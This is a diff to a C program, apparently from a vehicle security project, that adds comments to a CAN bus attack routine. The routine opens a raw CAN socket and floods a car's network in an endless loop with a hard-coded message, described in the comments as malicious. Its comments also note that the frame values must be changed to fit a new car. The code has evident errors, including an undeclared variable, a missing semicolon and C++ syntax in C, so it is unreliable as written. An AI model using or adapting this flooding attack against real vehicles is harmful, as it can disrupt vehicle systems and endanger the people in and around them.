@@ -1,3 +1,7 @@
+/*
+ * File will need to be edited since there's a new car now!
+ */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -17,16 +21,21 @@ int main() {
     return 0;
 }
 
+// Function used to send a buffer of bytes to the CAN bus
+//
+// Refer to https://web.eecs.umich.edu/~pmchen/eecs482/socketProgramming.pdf
+// if you have any questions about socket programming.
 int send(char* buff, int &s){
 	struct can_frame frame;
 	int nbytes;
 
-	/* parse buffer into can frame */
+	// parse buffer into can frame 
 	if (parse_canframe(buff, &frame)){
 		perror("parse");
 		return 1;
 	}
-
+    
+    // Write buffer to address (CAN bus)
     if((nbytes = sendto(s, &frame, sizeof(struct can_frame),
                     0, (struct sockaddr*)&addr, sizeof(addr)))){
     	perror("write");
@@ -36,13 +45,16 @@ int send(char* buff, int &s){
     return 0;
 }
 
+// Attack function for CAN bus attacks
+// Hex values passed to buffers will need to be edited in order
+// to work with the new car.
 void attacks(void){
 	
 	int s; 
 	struct sockaddr_can addr;
 	struct ifreq ifr;
 
-	/* open socket */
+	// open socket 
 	if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
 		perror("can't open socket");
 		close(s);
@@ -66,7 +78,9 @@ void attacks(void){
 		exit(1);
 	}
 
-	char* buf = "3BB#4000000000000000"
+	char* buf = "3BB#4000000000000000" // Will need to be changed
+		
+	// Send malicious message at a rate faster than the CAN bus expects
 	while(1)
 		{
 			if(send(buff, s)){
